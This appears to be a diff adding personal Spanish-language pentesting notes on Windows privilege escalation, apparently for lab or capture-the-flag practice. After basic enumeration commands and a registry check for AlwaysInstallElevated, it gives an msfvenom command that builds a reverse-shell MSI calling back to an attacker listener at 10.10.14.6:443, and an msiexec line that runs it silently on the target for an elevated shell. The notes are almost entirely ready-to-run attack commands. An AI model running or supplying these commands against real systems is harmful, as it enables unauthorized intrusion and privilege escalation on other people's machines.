@@ -1,0 +1,23 @@
+	#### Windows
+https://lolbas-project.github.io/#
+#Binarios windows
+
+### Comandos de busqueda
+net user <user>
+#Nos muestra la informacion de nuestro usuario: nombre, grupo, etc
+net localgroup <nombbre local group>
+#Nos muetra info del grupo, comentario, etc
+whoami /priv
+#Permite lista los privilegios
+whoami /all
+#Muestra toda la info dde nuestro perfil de usr
+tasklist
+#Procesos corriendo en el sistema
+
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+#Enumerar registros de Windows
+
+msfvenom -p windows -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.6 LPORT=443 -f msi -o rev.msi
+#Creo una reverse .msi
+msiexec /quiet /qn /i rev.msi
+#Ejecuto la reverse en el target para obtener shell como root en mi listener
